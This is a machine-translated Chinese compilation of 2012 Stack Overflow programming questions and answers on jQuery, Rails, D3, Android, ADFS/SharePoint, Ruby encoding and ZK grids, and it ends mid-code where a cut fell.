编辑：我现在已经上线了，所以有一个正在发生的事情的例子：http: [//www.copycei.com/#home](http://www.copycei.com/#home)

如果您从主页开始播放视频，请将鼠标悬停在右下角的幻影 YouTube 徽标上，您将看到剪辑的工具提示。真的希望我可以定位该位的 id/class 并将其稍微定位在左侧，但似乎无法在 Chrome 中检查和定位它。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-21T17:19:53.727

LongTailVideo（JW Player 的制造商）已将此作为用于嵌入 YouTube 视频的 Google API 的实际错误提交：

[https://code.google.com/p/gdata-issues/issues/detail?can=2&start=0&num=100&q=&colspec=API%20ID%20Type%20Status%20Priority%20Stars%20Summary&groupby=&sort=&id=2899](https://code.google.com/p/gdata-issues/issues/detail?can=2&start=0&num=100&q=&colspec=API%20ID%20Type%20Status%20Priority%20Stars%20Summary&groupby=&sort=&id=2899)

看起来目前还没有解决方案。

# jquery - 在jQuery中重叠多个setTimeouts

> ID：11091835
> 
> 赞同：3
> 
> 时间：2012-06-18T22:10:38.130
> 
> 标签：jquery, settimeout

这里是新的，也是 jQuery 的新手。我一直在寻找我的问题/问题的答案但没有成功，所以我来了。我在使用此代码时遇到问题：

```
<p>Hello.</p>
<p>Good bye.</p>
<p>Ciao!</p>
<script>
jQuery('p').mouseover(
    function() {
        jQuery(this).css({backgroundColor:'red'});
    }
);
jQuery('p').mouseout(
    function() {
        myElement = jQuery(this);
        setTimeout(function(){
            color = ['red','green','blue','orange'];
            myElement.css({backgroundColor:color[Math.round(Math.random()*3)]});
        }, 1000
        )
    }
);
</script> 
```

问题是，如果我们在执行最后一个 setTimeout 函数之前将光标移到一个新段落上，那么第一个和第二个 setTimeout 函数都将作用于最后一个受影响的段落。例如：

a) 将光标移到/移出段落。在执行与 mouseout 事件关联的 setTimeout 函数之前，

b) 将光标移到/移出不同的段落。现在 setTimeout 函数

```
myElement.css({backgroundColor:color[Math.round(Math.random()*3)]}); 
```

将连续两次为第二段选择背景颜色，而为第一段选择无背景颜色。我尝试将两个不同的变量（myElementOne 和 myElementTwo）与 jQuery(this) 值相关联，但无济于事。我将不胜感激一些帮助。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:20:40.880

问题是您的`myElement`变量是在[全局范围内](http://en.wikipedia.org/wiki/Global_variable)定义的，并且每次`mouseout`执行都会覆盖它的先前值。

如果您使用 定义`myElement`，则将仅在当前事件的范围内定义`var myElement = jQuery(this);`-并且仅影响超时回调中的该元素。`myElement``mouseout`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:21:04.450

我看到它的方式`myElement`变成了全局的，并且在任何时候都只指一个 div。在它前面加上`var`，使它`this`在时间上引用特定的。

```
jQuery('p').mouseout(
    function() {
        var myElement = jQuery(this);
        ... 
```

[**演示**](http://jsfiddle.net/m6f6b/)

# java - Ctrl+箭头键、多字变量名和eclipse pydev

> ID：11091836
> 
> 赞同：2
> 
> 时间：2012-06-18T22:10:39.277
> 
> 标签：java, python, eclipse, keyboard-shortcuts, pydev

**警告**：我不确定这篇文章是否更适合超级用户或 SE 家族中的其他论坛。如果您知道更适合此帖子的位置，请告诉我，我会迁移它。

我知道 Java 的 Eclipse 扩展了`Ctrl`+ `Left`、`Ctrl`+`Right`快捷方式以在驼峰式多字变量名称中移动光标。这是我非常喜欢 eclipse 的一个特性。

但是，当我在 Eclipse 上使用 PyDev 插件进行 python 编程时，这个功能似乎不存在。

有谁知道我如何在 PyDev 中获取/启用此功能（或者它现在不存在）

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T23:22:28.723

在 PyDev 的 sourceforge 页面上有一个针对此的开放功能请求，[请参见此处](http://sourceforge.net/tracker/?func=detail&aid=3072381&group_id=85796&atid=577332)。我想这证实了它“现在不存在”。

该请求最初是从 2010 年开始的，但显然尚未受到太多关注。也许您可以将您的声音添加到功能请求中，以便尽快完成。

# ruby-on-rails - ActiveModel::MassAssignmentSecurity::错误

> ID：11091837
> 
> 赞同：3
> 
> 时间：2012-06-18T22:10:59.560
> 
> 标签：ruby-on-rails, devise, omniauth, facebook-authentication

嗨，我正在使用 devise 和 omniauth 来验证 facebook 登录，但我收到以下错误：

```
Can't mass-assign protected attributes: token
app/models/user.rb:20:in `apply_omniauth'
app/controllers/authentications_controller.rb:19:in `create' 
```

这是用户模型：

```
class User < ActiveRecord::Base

  # The relationship between the User and Authentication model
  has_many :authentications, :dependent => :delete_all

  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me,
  # attr_accessible :title, :body

  def apply_omniauth(auth)
    # In previous omniauth, 'user_info' was used in place of 'raw_info'
    self.email = auth['extra']['raw_info']['email']
    authentications.build(:provider => auth['provider'], :uid => auth['uid'], :token => auth['credentials']['token'])
  end

end 
```

这是我的身份验证控制器：

```
class AuthenticationsController < ApplicationController
  def index
    @authentications = current_user.authentications if current_user
  end

  def create
    auth = request.env["omniauth.auth"]

    # Try to find authentication first
    authentication = Authentication.find_by_provider_and_uid(auth['provider'], auth['uid'])

    if authentication
      # Authentication found, sign the user in.
      flash[:notice] = "Signed in successfully."
      sign_in_and_redirect(:user, authentication.user)
    else
      # Authentication not found, thus a new user.
      user = User.new
      user.apply_omniauth(auth)
      if user.save(:validate => false)
        flash[:notice] = "Account created and signed in successfully."
        sign_in_and_redirect(:user, user)
      else
        flash[:error] = "Error while creating a user account. Please try again."
        redirect_to root_url
      end
    end 
  end

  def destroy
    @authentication = Authentication.find(params[:id])
    @authentication.destroy
    redirect_to authentications_url, :notice => "Successfully destroyed authentication."
  end
end 
```

有人可以解释为什么我会收到这个错误，以及我如何解决它吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:13:40.743

添加`:token`到`attr_accessible`身份验证模型中的行应该可以解决问题。

# asp.net-mvc - 如何使用 Visual Studio 2012 Express 将 ASP.NET MVC 4 应用程序部署到 Web 托管提供商子目录？

> ID：11091839
> 
> 赞同：1
> 
> 时间：2012-06-18T22:11:12.423
> 
> 标签：asp.net-mvc, deployment, publish, web-hosting

我下载**了 Visual Studio Express 2012 RC for Web**，创建了一个 ASP.NET MVC 4 应用程序，单击**F5**并在 Chrome 中查看一个基本的、功能正常的站点，其中包含数据库：

![在此处输入图像描述](../Images/ebd438d6bddceda0b9d30440810d94f6.png)

现在我想将它发布到具有“ASP.NET 1.1 到 4.0”的网络托管服务提供商 (domainbox.de)，但不是发布到主站点 (tanguay.de)，而是发布到子目录（例如 tanguay.de/测试）。

但是，当我右键单击解决方案名称并选择发布时，我可以**通过 FTP 上传**，但它似乎只让我能够发布到**我的域的根目录**。这就是我记得 ASP.NET 2.0 是如何工作的——在子目录中托管多个网站是不可能的。

![在此处输入图像描述](../Images/bd7377a59a676a4508a59a14021741ed.png)

**如何将此站点发布到 tanguay.de/test，然后创建另一个站点并将其发布到 tanguay.de/test2 等。这可能吗？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T02:42:59.763

在目标位置字段中，您可以输入站点的完整路径，例如 tanguay.de/wwwroot/test2（或它映射到的任何路径）。

# capability - 如何启用/禁用 Metro 应用程序设置功能？

> ID：11091845
> 
> 赞同：0
> 
> 时间：2012-06-18T22:11:35.533
> 
> 标签：capability, microsoft-metro

如何在 Metro 应用程序中以编程方式启用/禁用功能，即包应用程序清单中定义的功能设置，例如互联网、麦克风、位置等？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:17:38.540

我进行了 Google 搜索，然后在我的 MSVS2012RC（支持 Metro 的最新/最好的编译器）的副本上启动了“帮助”。

然后答案是“您必须在包清单中设置功能，并且*只能*在包清单中”。似乎无法以编程方式更改功能。

# r - 读取 HITRAN 文件格式

> ID：11091850
> 
> 赞同：2
> 
> 时间：2012-06-18T22:12:04.733
> 
> 标签：r

以[这个文件](http://www.cfa.harvard.edu/hitran/Updated/01_hit09.par)为例，我正在尝试读取 data.frame 中的数据。从[文档](http://www.cfa.harvard.edu/hitran/Download/HITRAN04paper.pdf)（pdf 文件，表 1）中，它遵循一些 fortran 约定。我尝试了以下但收效甚微：

```
dir <- "Uncompressed-files/"
file <- "01_hit09.par"

delim <- c("I2", "I1", "F12.6", "E10.3", "E10.3", "F5.4", "F5.4", 
"F10.4", "F4.2", "F8.6", "A15", "A15", "A15", "A15", "6I1", "6I2", 
"A1", "F7.1", "F7.1")
test <- read.fortran(paste0(dir, file), delim)

test <- read.fwf(paste0(dir, file),
                 c(2, 1, 12, 10, 10, 5, 5, 10, 4, 8,
                   15, 15, 15, 15, 6, 12, 1, 7, 7)) 
```

指定正确格式的任何提示？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:41:42.177

根据`?read.fortran`：

1.  `"E"`不是受支持的格式。
2.  “在 'F' 或 'D' 格式中指定 'd > 0' 会将小数点 'd' 向左移动，即使它在输入文件中明确指定。”

因此，更改`"E"`并`"F"`删除所有显式十进制格式：

```
file <- "01_hit09.par"
delim <- c("I2", "I1", "F12", "F10", "F10", "F5", "F5", "F10", "F4", "F8",
           "A15", "A15", "A15", "A15", "6I1", "6I2", "A1", "F7", "F7")
(test <- read.fortran(file, delim, n=10)) 
```

更新：或正确指定宽度并使用`read.fwf`：

```
 test2 <- read.fwf(file, c(2,1,12,10,10,5,5,10,4,8,15,15,15,15,
                           rep(1,6),rep(2,6),1,7,7), as.is=TRUE) 
```

# java - 以一定的顺序或序列号将两个数组列表合二为一

> ID：11091852
> 
> 赞同：0
> 
> 时间：2012-06-18T22:12:10.067
> 
> 标签：java, serialization, arraylist, hashmap

我找不到比这更好的标题了，所以请原谅我的任何混淆。

我想将两个 hashmap 组合成一个 hashmap。我实际上是使用 hashmaps 来包含 table where`key=coloumName`和的数据`value= coloumValues`。我的代码看起来像

```
HashMap<String, ArrayList> FTMap = table1.getColumn().getColumnValues()
HashMap<String, ArrayList> STMap = table2.getColumn().getColumnValues()

HashMap<String, ArrayList> FinalTableMap = new HashMap()

FinalTableMap.putAll(FTMap)
FinalTableMap.putAll(STMap) 
```

我对列名没有任何问题，但是合并后列值的顺序不起作用。由于我使用的是arraylist，我正在尝试比较两个arraylist并将其放入最终的arraylist中，该arraylist可以用作最终hashmap的值。我需要一些关于两个arraylist之间匹配的建议或建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:23:59.920

习惯`addAll`组合列表后，可以使用[Collections.sort(List, Comparator)](http://docs.oracle.com/javase/7/docs/api/java/util/Collections.html#sort%28java.util.List,%20java.util.Comparator%29)对`ArrayList`. 在您`Comparator`的[比较](http://docs.oracle.com/javase/7/docs/api/java/util/Comparator.html#compare%28T,%20T%29)功能中，您将使用您希望排序的值比较两个对象（您提到了序列号？）。

有关简要示例，请参阅[按属性对自定义对象的 ArrayList 排序。](https://stackoverflow.com/questions/2784514/sort-arraylist-of-custom-objects-by-property)

# android - 如何在任何异常时暂停 Eclipse？

> ID：11091860
> 
> 赞同：7
> 
> 时间：2012-06-18T22:13:24.053
> 
> 标签：android, eclipse, debugging, exception

我找到了“添加 Java 异常断点”菜单项，但它似乎只适用于我选择的确切异常类型。因此，如果我要求它中断`Exception`，它不会在 a 的情况下中断`NumberFormatException`。我如何让它打破所有异常？

我的活动无缘无故退出，没有 LogCat 输出，因此很高兴了解正在发生的任何异常，无论是捕获还是未捕获，无论是在我的代码中还是仅在 Android 中。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-18T22:39:31.583

1.  `java.lang.Throwable`为（这是所有异常中最具体的超类 - 与 不同`Exception`，它还匹配 的实例`Error`）创建一个异常断点
2.  右键单击它，选择属性，然后检查“此异常的子类”

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-18T22:35:49.797

您应该能够使用它在窗口中指定的模式匹配来执行此操作。具体来说，`*`将匹配任何字符串（包括空字符串），因此`*Exception*`将匹配其中包含子字符串`Exception`的所有字符串，包括字符串`Exception`本身和`Exception`开头或结尾的字符串。

# javascript - 如何在加载 Web 图像（非本地）时替换/屏蔽特定颜色？

> ID：11091862
> 
> 赞同：1
> 
> 时间：2012-06-18T22:13:47.920
> 
> 标签：javascript, html, image, colors

这是我喜欢做的事情。假设我正在浏览器上从 example.com/test.png 加载图像，并且图像未保存在本地服务器上。然后，我喜欢检测图像中的蓝色并用红色替换/掩盖它。换句话说，颜色在加载时显示不同。使用 javascript、html、...或任何其他方式是否实用？

如果图像是本地的，我们可以使用颜色检测代码并创建具有修改颜色的新图像。但是，在实时图像加载中，该过程似乎有所不同。如果有人可以指导我使用任何 api、示例代码、读数，我将不胜感激……

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:18:29.837

您可以查看[CSS3 Filters](http://davidwalsh.name/css-filters) - 特别是`hue()`属性。不过，可能不如您要的精确，采用特定的像素色调并有条件地更改它。

或者，您可以将图像加载到`<canvas>`标签中，您可以在其中做任何您想做的事情，尽管需要考虑[某些限制](https://stackoverflow.com/a/7988342/752213)。

# javascript - DOM 节点清理如何在 d3 中工作？

> ID：11091865
> 
> 赞同：13
> 
> 时间：2012-06-18T22:14:19.620
> 
> 标签：javascript, svg, garbage-collection, d3.js

我正在主干视图中使用 D3 进行图形可视化。我允许用户捏缩放图形，使用 webkit 转换平滑过渡，并在发布时重绘。为了保持代码简单，我只是以新的比例重绘图表，而不是重新计算元素的新位置和大小（这是我最初的方法，但我的团队要求重绘路线）。

[我通过推特与博斯托克交谈。这实际上不是首选的做事方式]

我注意到的是，对于每次重绘，我都会倾倒大量未清理的 dom 节点。

这与事件处理程序/闭包中的循环引用无关，因为我已经禁用了除我的标签之外的所有标签（这些标签没有附加处理程序），并且发生了相同的行为。

我已经尝试过从图中积极地删除元素，但 dom 节点似乎仍然泄漏。

这是一些相关的代码。为一组新标签调用“渲染”。完成缩放后，在旧图形上调用“关闭”，并使用另一个视图实例化创建一个新图形并调用“渲染”：

```
render: function() {

        // create the svg offscreen/off dom
        //document.createElementNS(d3.ns.prefix.svg, "svg")
        var svg = this.svg = d3.select(this.el)
            .append("svg:svg")
            .attr('width', this.VIEW_WIDTH)
            .attr('height', this.VIEW_HEIGHT)

        this._drawTimeTicks.call(this, true);
        return this;
    },

_drawTimeTicks: function(includeLabels) {
    var bounds = this.getDayBounds();
    var min = bounds.start;
    var date = new Date(min);
    var hour = 1000 * 60 * 60;
    var hourDiff = 60 * this.SCALE;
    var graphX = (date.getTime() - min) / 1000 / 60;
    var textMargin = 7;
    var textVert = 11;

    // Using for loop to draw multiple vertical lines
    // and time labels.

    var timeTicks = d3.select(this.el).select('svg');
    var width = timeTicks.attr('width');
    var height = timeTicks.attr('height');

    for (graphX; graphX < width; graphX += hourDiff) {
        timeTicks.append("svg:line")
            .attr("x1", graphX)
            .attr("y1", 0)
            .attr("x2", graphX)
            .attr("y2", height)
            .classed('timeTick');

        if (includeLabels) {
            timeTicks.append("svg:text")
                .classed("timeLabel", true)
                .text(this.formatDate(date))
                .attr("x", graphX + textMargin)
                .attr("y", textVert);
        }

        date.setTime(date.getTime() + hour);
    }

close: function() {
        console.log("### closing the header");
        this.svg.selectAll('*').remove();
        this.svg.remove();
        this.svg = null;
        this.el.innerHTML = '';

        this.unbind();
        this.remove();
    } 
```

如您所见，我没有对事件处理程序或闭包做任何棘手的事情。通过一些缩放交互，我可以泄漏数十个 GC 从未回收的 dom 节点。

这是内存泄漏，还是 d3 在幕后做了一些事情来优化未来的图形构建/更新？有没有更好的方法来破坏我不知道的图表？

有任何想法吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-06-21T23:01:22.450

D3 不会保留对节点的任何隐藏引用，因此没有“DOM 节点清理”的内部概念。有简单的选择，它们是 DOM 元素的数组，以及 DOM 本身。如果您从 DOM 中删除了一个元素，并且您没有保留对它的任何其他引用，则它应该由垃圾收集器回收。

（此外：尚不清楚您所指的泄漏是留在 DOM 中的元素还是垃圾收集器未回收的孤立元素。过去，一些较旧的浏览器存在错误，即垃圾收集 DOM 元素和 JavaScript 闭包之间的循环引用，但我不知道有任何影响现代浏览器的此类问题。）

如果您正在更新 DOM，执行此操作的最高效方式是（通常）使用数据连接，因为这允许您重用现有元素并且只修改需要更改的属性。对数据连接使用键函数对于[对象恒定性](http://bost.ocks.org/mike/constancy/)也是一个好主意；如果更新前后都显示相同的数据，那么您可能不需要重新计算其所有属性，并且浏览器更新的工作更少。

在某些情况下，有更快的任意更新的替代方法，例如更新封闭 G 元素的变换属性，而不是更新后代元素的位置。作为另一个示例，您可以通过更改 viewBox 属性在 SVG 元素中进行几何缩放。但是几何缩放是一个非常有限的情况；一般来说，最有效的更新取决于具体发生了什么变化。使用数据连接，以便您可以最大限度地减少附加或删除的元素数量，并最大限度地减少需要重新计算的属性数量。

我还要指出其他几件事……</p>

*   您可以使用数据连接同时创建多个刻度，而不是使用 for 循环。For 循环几乎从不与 D3 一起使用，因为数据连接可以在没有循环的情况下创建多个元素（和层次结构）。更好的是，使用轴组件 (d3.svg.axis) 和时间格式 (d3.time.format) 的时间刻度 (d3.time.scale)。

*   最新版本的 D3 不需要“svg:”命名空间，因此您可以附加“text”、“line”等。

*   我想不出任何`selectAll("*").remove()`有意义的情况。“*”选择器匹配所有后代，因此这将从其父代中删除每个后代。您应该始终尝试删除最顶层的元素（此处为 SVG 容器），而不是多余地删除子元素。

# sharepoint-2010 - 基于 ADFS 声明的 SharePoint 2010 和嵌入式 IFrame ASP.NET 声明感知应用程序单点登录

> ID：11091871
> 
> 赞同：3
> 
> 时间：2012-06-18T22:15:07.967
> 
> 标签：sharepoint-2010, wif, claims-based-identity, adfs2.0

我有一个 SharePoint 2010 网站，仅将声明配置为 ADFS 的回复方。我还有一个为声明配置的 ASP.NET 应用程序，使用 WIF + Extension for SAML 2.0 CTP 作为同一 ADFS 服务器的回复方。

如果我导航到 SharePoint，我会被重定向到 ADFS 服务器 ( [https://.../adfs/ls?...](https://.../adfs/ls?..) ) 并出现 Windows 登录提示。如果我随后在同一个浏览器实例中导航到我的 ASP.NET 应用程序，重定向会很快发生到同一个 ADFS 服务器，自动进行身份验证，并在没有安全提示的情况下重定向回 ASP.NET 应用程序。如[如何在 SharePoint 2010 站点和 ASP.NET 应用程序之间共享身份验证上下文](https://stackoverflow.com/questions/3478111/how-to-share-authentication-context-between-a-sharepoint-2010-site-and-asp-net-a)。

当我在 SharePoint Web 部件的 IFrame 中嵌入 ASP.NET 应用程序时，会出现此问题。当启动一个新的浏览器实例并导航到 SharePoint 时，我会收到 Windows 登录提示。当页面加载到 IFrame 时，我会为嵌入 ASP.NET 应用程序的同一服务器获得第二个 Windows 提示。如果我取消提示，我会在 IFrame 中收到 401 Unauthorized。如果我导航到 ASP.NET 应用程序，我不会收到提示，它会自动登录。导航回 SharePoint 应用程序，页面将加载，包括 IFrame 内容而没有提示。

SharePoint Endpoint 使用 WS-Federation Passive Endpoint 来`https://sharepoint:port/_trust/`绑定 POST。ASP.NET 应用程序端点正在使用`https://aspnetapp/`具有绑定 POST 和工件的 SAML 断言使用者端点。从两者传递的声明包含每个应用程序所需的所有内容。

有谁知道在 SharePoint 中使用 IFrame 时如何防止第二次登录提示？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-25T02:18:57.040

`System.IdentityModel.Services.WSFederationAuthenticationModule, System.IdentityModel.Services, Version=4.0.0.0`现在，在从现在内置的 WIF 类更新到单点登录后，它现在可以按预期工作 。我假设`Microsoft.IdentityModel.Web.Saml2AuthenticationModule`从未完成的 SAML 2.0 CTP 扩展存在兼容性问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-18T07:55:59.313

只是在黑暗中拍摄，但假设自定义 ASP .NET 应用程序和 SharePoint 位于两台不同的机器上，那么考虑到 ASP .NET 页面位于 IFRAME 中，可能存在一些关于 kerberos 的微妙之处 - 可能是 kerberos 票证需要在 SharePoint 和 ASP .NET 之间传递。

HTH。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-18T08:22:09.667

这只是一个猜测，但我相信这是因为两个站点，Sharepoint 站点和 iframe 中的嵌入式 asp.net 站点，同时开始加载。

由于两者都未经过身份验证，因此它们都进入了 Adfs。但是因为您没有经过身份验证，Adfs 会启动 401 质询，要求进行身份验证。但是，您的 Web 浏览器不会同时显示两个登录提示。相反，您会收到第一个登录提示，并且当您成功登录时，从那一刻起，Adfs 将保留身份验证，以便任何其他提出索赔的站点都可以免费获得它们。但是内部站点，asp.net 站点，已经开始了登录过程！您的浏览器不知道这一点，并强制您继续登录。

作为结论，我的想法是有一个需要身份验证的共享点页面，然后重定向到另一个页面，该页面在 iframe 中有 asp.net 站点，这样您的浏览器就不会尝试在同时。

# ruby - 在 ruby 中处理来自 json 的错误 UTF-8

> ID：11091879
> 
> 赞同：6
> 
> 时间：2012-06-18T22:15:49.100
> 
> 标签：ruby, json, encoding, utf-8

我在[http://hndroidapi.appspot.com/news/format/json/page/?appid=test](http://hndroidapi.appspot.com/news/format/json/page/?appid=test)从远程 json 提取数据。我遇到的问题是这个 API 似乎在构建 JSON 时没有正确处理 UTF-8 编码（如果我在这里错了，请纠正我）。例如，现在通过的部分结果是

```
{
"title":"IPad - please don&euro;&trade;t ding while you and I are asleep  ",
"url":"http://modern-products.tumblr.com/post/25384729998/ipad-please-dont-ding-while-you-and-i-are-asleep",
"score":"10 points",
"user":"roee",
"comments":"18 comments",
"time":"1 hour ago",
"item_id":"4128497",
"description":"10 points by roee 1 hour ago  | 18 comments"
} 
```

注意`don&euro;&trade;t`. 这不是它令人窒息的唯一类型的角色。鉴于我不控制 API，我能做些什么来将数据转换为干净的东西吗？

编辑：

这是我拉下 JSON 的方式：

```
hn_url = "http://hndroidapi.appspot.com/news/format/json/page/?appid=test"
  url = URI.parse(hn_url)

  # Attempt to get the json
  req = Net::HTTP::Get.new(hn_url)
  req.add_field('User-Agent', 'Test')
  res = Net::HTTP.start(url.host, url.port) {|http| http.request(req) }
  response = res.body
  if response.nil?
    puts "Bad response when fetching HN json"
    return
  end

  # Attempt to parse the json
  result = JSON.parse(response)
  if result.nil?
    puts "Error parsing HN json"
    return
  end 
```

编辑2：

**刚刚找到 API 的 GitHub 页面。看起来这是一个悬而未决的问题。仍然不确定我是否可以从最后做任何解决方法：** [https ://github.com/glebpopov/Hacker-News-Droid-API/issues/4](https://github.com/glebpopov/Hacker-News-Droid-API/issues/4)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T23:00:08.283

看起来您收到的 JSON 响应正文是以 US-ASCII 而不是 UTF-8 接收的，因为`Net::HTTP`故意不强制编码。

```
1.9.3p194 :044 > puts res.body.encoding
US-ASCII 
```

在 Ruby 1.9.3 中，如果您知道编码应该是什么，您可以强制编码。尝试这个：

```
response = res.body.force_encoding('UTF-8') 
```

JSON 解析器应该按照您希望的方式处理 UTF-8。

**参考**

*   [http://bugs.ruby-lang.org/ - Net::HTTP 不能正确处理编码](http://bugs.ruby-lang.org/issues/2567)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-05-22T18:35:16.157

使用`force_encoding`似乎是最好的解决方案。跟进凯文迪克森的回答，这里是对怪异的解释。

`Net::HTTP`有点乱。

**在 1.9.3 上**：

*   如果服务器发送分块响应，您总是会得到 ASCII-8BIT。这似乎优先于其他情况。
*   如果你`http.request`用一个`Get`对象调用，你会得到 US-ASCII。此方法不会为您进行压缩。
*   如果您调用`http.get`，则启用压缩。
    *   如果服务器支持压缩，你会得到 ASCII-8BIT
    *   如果服务器不发送压缩体，你会得到 US-ASCII

你会得到 US-ASCII，因为当`Net::HTTP`创建缓冲区字符串来接收响应时，它是在解释器的默认源文件编码中创建的，即 US-ASCII。（`net/`源文件，顶部没有魔术编码注释，所以它们使用 ruby​​ 的默认值。）

解压缩会产生 ASCII-8BIT，因为它`get`在解压缩时在方法中进行了硬编码。

**在 2.0**上，您似乎总是得到 UTF-8，但这是因为这是默认的源文件编码。如果您通过`-K`选项更改它，响应编码将相应更改。尝试将`n`, `e`, `s`,传递`u`给`-K`.

# android - findViewById 在特定布局中？

> ID：11091881
> 
> 赞同：3
> 
> 时间：2012-06-18T22:16:04.440
> 
> 标签：android

除了在 xml 中添加 id 前缀，是否可以在代码中指定特定的布局？例如，如果我有 3 个布局，每个布局都有一个 id 为“btn”的按钮。是否可以指定 findViewById(R.id.btn) 的布局？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:20:05.217

基本上下文是通过定义的`setContentView(R.lyaout.my_layout)`。如果你使用`LayoutInflater.inflate()`你得到一个布局对象来膨胀另一个布局，让我们调用它`buttonLayout`。您现在可以区分`this.findViewById(R.id.button)`和`buttonLayout.findViewById(R.id.button)`，两者都会给您不同的按钮参考。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-18T22:18:33.597

`findViewById`是`View`类的方法。您可以指定应该在哪里搜索视图

```
final View container = new View(context); 
container.findViewById(R.id.btn); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T22:22:08.460

如果您的内容视图是一个复杂的层次结构，其中有多个具有 id 的视图`btn`，您将需要导航到层次结构的子树并从那里搜索。假设您有三个`LinearLayout`视图，每个`btn`视图中的某个位置都有一个视图。如果您可以先选择正确的`LinearLayout`（通过 id、tag、position 或其他方式），则可以找到正确的`btn`视图。如果相关`LinearLayout`的 id 为`branch1`，例如：

```
View parent = findViewById(R.id.branch1); // Activity method
View btn = parent.findViewById(R.id.btn); // View method 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-18T22:27:33.863

如果你的 btns 在不同的视图组中，这是可能的，但需要给视图组一个不同的名称！为此，最简单的方法是在您的 Activity 中定义其自己的 XML（即 button_layout.xml）中的 Button 布局，您可以这样做：

```
public MyActivity extends Activity{

  Button btn1, btn2, btn3;

  public void onCreate(Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    LayoutInflater inflater = (LayoutInflater)getSystemService(LAYOUT_INFLATER_SERVICE);

    LinearLayout ll = new LinearLayout(this);
    setContentView(ll);

    btn1 = (Button)inflater.inflate(R.layout.button_layout, ll);
    btn2 = (Button)inflater.inflate(R.layout.button_layout, ll);
    btn3 = (Button)inflater.inflate(R.layout.button_layout, ll);

  }
} 
```

# java - 如何清理 ZK 上的网格

> ID：11091883
> 
> 赞同：1
> 
> 时间：2012-06-18T22:16:15.553
> 
> 标签：java, grid, rendering, zk

我正在使用网格和 java 类将数据呈现到行中，一切正常，数据显示到网格中，但问题是当您第二次单击将数据呈现到网格的按钮时，数据仍然存在并且新数据被添加到行中。我正在使用`Jboss 4.2`

这是 RowRender Java 类：

```
import org.zkoss.zul.Label;
import org.zkoss.zul.Row;
import org.zkoss.zul.RowRenderer;

public class MyRowRenderer implements RowRenderer<Object> {
    @Override
    public void render(final Row row, final java.lang.Object data, int arg2)
            throws Exception {
        String[] ary = (String[]) data;
        for(int i=0;i<ary.length;i++){
            new Label(ary[i]).setParent(row);
        }
    }
} 
```

这是 Java 类监听器的一部分：

```
public void onClick$generar(Event e) {
        try {
            if(fecha.getValue()==null){
                Messagebox.show("Ingresa una fecha valida MM-yyyy", "Error", Messagebox.OK, Messagebox.ERROR);
            }else{
                SimpleDateFormat formato = new SimpleDateFormat("yyyy-MM-dd");
                ffecha = formato.format(fecha.getValue()).substring(0, 7);
                String Order = orderby.getSelectedItem().getValue().toString();
                String Modo = modo.getSelectedItem().getValue().toString();
                inboxGrid.setModel(new ListModelList(getUpdatedData(ffecha, Order, Modo)));
            }
        } catch (ClassNotFoundException e1) {
            e1.printStackTrace();
        }
    } 
```

这是 index.zul 中的 GRID

```
<grid id="inboxGrid" mold="paging" pageSize="15"
                rowRenderer="com.app.reports.MyRowRenderer"
                emptyMessage="Sin Registros!">
                <auxhead>
                    <auxheader colspan="5" class="topic">
                        REPORTE MENSUAL
                    </auxheader>
                </auxhead>
                <columns>
                    <column width="100px" label="CLAVE" align="center" />
                    <column label="SUCURSAL" align="center" />
                    <column width="100px" label="PAGINAS"
                        align="center" />
                    <column width="100px" label="EDO CUENTA"
                        align="center" />
                    <column width="100px" label="IMPRESION"
                        align="center" />
                    <column width="100px" label="MENSAJERIA"
                        align="center" />
                    <column width="100px" label="TOTAL" align="center" />
                </columns>
            </grid> 
```

第一次显示4条记录，没错，数据库中只有4条记录，第二次按下“generar”按钮显示8条记录（4x2），我试着放上`inboxGrid.getRows().getChildren().clear()`按钮；但仍然表现出相同的行为。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T04:04:50.040

它必须在您的 getUpdatedData(ffecha, Order, Modo)) 函数中。这与 ZK 无关。

请检查 getUpdatedData(ffecha, Order, Modo)) 返回的项目数，我猜该函数第二次会返回 8 个项目。一旦你设置模型 ZK 将只输出列表中传递给它的项目数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T15:01:41.803

这是解决这个问题的方法！

```
private List<String[]> getUpdatedData(String a, String order,String modo)
        throws ClassNotFoundException {
     //This is how you clean the list for the next click
    list.clear();
    list2.clear();
    try {
        Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
        String conexion = "jdbc:sqlserver://" + dbhost + ":" + port
                + ";databaseName=" + db;
        Connection conn = DriverManager.getConnection(conexion, user, pwd);
        PreparedStatement stmt = null;
        stmt = conn
